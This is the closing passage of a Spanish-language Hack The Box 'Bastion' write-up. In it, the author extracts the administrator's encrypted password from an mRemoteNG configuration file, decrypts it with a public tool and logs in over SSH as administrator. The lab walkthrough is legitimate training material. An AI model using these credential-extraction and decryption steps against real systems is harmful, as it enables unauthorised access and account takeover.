+ <span class="nv">RDGatewayUseConnectionCredentials</span><span class="o">=</span><span class="s2">"Yes"</span> <span class="nv">RDGatewayUsername</span><span class="o">=</span><span class="s2">""</span> <span class="nv">RDGatewayPassword</span><span class="o">=</span><span class="s2">""</span> <span class="nv">RDGatewayDomain</span><span class="o">=</span><span class="s2">""</span> <span class="nv">InheritCacheBitmaps</span><span class="o">=</span><span class="s2">"false
+"</span> <span class="nv">InheritColors</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritDescription</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritDisplayThemes</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritDisplayWallpaper</span><span class="o">=</span><span class="s2">"false"</span> InheritEnableFon
+<span class="nv">tSmoothing</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritEnableDesktopComposition</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritDomain</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritIcon</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritPanel</span><span class="o">=</span><span class="s2">"false"</span> Inheri
+<span class="nv">tPassword</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritPort</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritProtocol</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritPuttySession</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRedirectDiskDrives</span><span class="o">=</span><span class="s2">"false"</span> Inhe
+<span class="nv">ritRedirectKeys</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRedirectPorts</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRedirectPrinters</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRedirectSmartCards</span><span class="o">=</span><span class="s2">"false"</span> InheritRe
+<span class="nv">directSound</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritSoundQuality</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritResolution</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritAutomaticResize</span><span class="o">=</span><span class="s2">"false"</span> InheritUseConsoleSessio
+<span class="nv">n</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritUseCredSsp</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRenderingEngine</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritUsername</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritICAEncryptionStrength</span><span class="o">=</span><span class="s2">"false"</span> 
+<span class="nv">InheritRDPAuthenticationLevel</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDPMinutesToIdleTimeout</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDPAlertIdleTimeout</span><span class="o">=</span><span class="s2">"false"</span> InheritLoadBalan
+<span class="nv">ceInfo</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritPreExtApp</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritPostExtApp</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritMacAddress</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritUserField</span><span class="o">=</span><span class="s2">"false"</span> InheritExtA
+<span class="nv">pp</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCCompression</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCEncoding</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCAuthMode</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCProxyType</span><span class="o">=</span><span class="s2">"false"</span> Inher
+<span class="nv">itVNCProxyIP</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCProxyPort</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCProxyUsername</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCProxyPassword</span><span class="o">=</span><span class="s2">"false"</span> InheritVNCColor
+<span class="nv">s</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCSmartSizeMode</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCViewOnly</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDGatewayUsageMethod</span><span class="o">=</span><span class="s2">"false"</span> InheritRDGatewayHostnam
+<span class="nv">e</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDGatewayUseConnectionCredentials</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDGatewayUsername</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDGatewayPassword</span><span class="o">=</span><span class="s2">"false"</span> Inh
+<span class="nv">eritRDGatewayDomain</span><span class="o">=</span><span class="s2">"false"</span> /&gt;                                                                                                  
+&lt;/mrng:Connections&gt;                                                                                                             
+l4mpje@BASTION C:<span class="se">\U</span>sers<span class="se">\L</span>4mpje<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\m</span>RemoteNG&gt;
+</code></pre></div></div>
+
+<p>Dentro de dicho archivo vemos la contraseña del usuario <strong>administrator</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">Id</span><span class="o">=</span><span class="s2">"500e7d58-662a-44d4-aff0-3a4f547a3fee"</span> <span class="nv">Username</span><span class="o">=</span><span class="s2">"Administrator"</span> <span class="nv">Domain</span><span class="o">=</span><span class="s2">""</span> <span class="nv">Password</span><span class="o">=</span><span class="s2">"aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="</span> 
+</code></pre></div></div>
+
+<p>Ahora, nos descargamos la siguiente utilidad que nos ayudará a descifrar la contraseña:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git clone https://github.com/haseebT/mRemoteNG-Decrypt
+Clonando en <span class="s1">'mRemoteNG-Decrypt'</span>...
+remote: Enumerating objects: 19, <span class="k">done</span><span class="nb">.</span>
+remote: Total 19 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 19
+Recibiendo objetos: 100% <span class="o">(</span>19/19<span class="o">)</span>, 14.80 KiB | 14.80 MiB/s, listo.
+Resolviendo deltas: 100% <span class="o">(</span>4/4<span class="o">)</span>, listo.
+</code></pre></div></div>
+
+<p>Y la ejecutamos de acuerdo nos indica el propietario:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 mremoteng_decrypt.py <span class="nt">-s</span> aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw<span class="o">==</span>
+Password: thXLHM96BeKL0ER2
+</code></pre></div></div>
+
+<p>Tenemos la contraseña del usuario <strong>administrator</strong>; así que podríamos tratar de ingresar vía ssh a la máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh administrator@10.10.10.134
+administrator@10.10.10.134<span class="s1">'s password:
+Microsoft Windows [Version 10.0.14393]                                                                                          
+(c) 2016 Microsoft Corporation. All rights reserved.                                                                            
+
+administrator@BASTION C:\Users\Administrator&gt;whoami                                                                             
+bastion\administrator                                                                                                           
+
+administrator@BASTION C:\Users\Administrator&gt; 
+</span></code></pre></div></div>
+
+<p>Ya somos el usuario <strong>administrator</strong> y podemos visualizar la flag (root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#file-misconfiguration" class="page__taxonomy-item" rel="tag">File_Misconfiguration</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#powershell" class="page__taxonomy-item" rel="tag">Powershell</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-03-18T00:00:00-06:00">March 18, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-jerry/" class="pagination--pager" title="Hack The Box Jerry
+">Previous</a>
+    
+    
+      <a href="/htb-blocky/" class="pagination--pager" title="Hack The Box Blocky
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
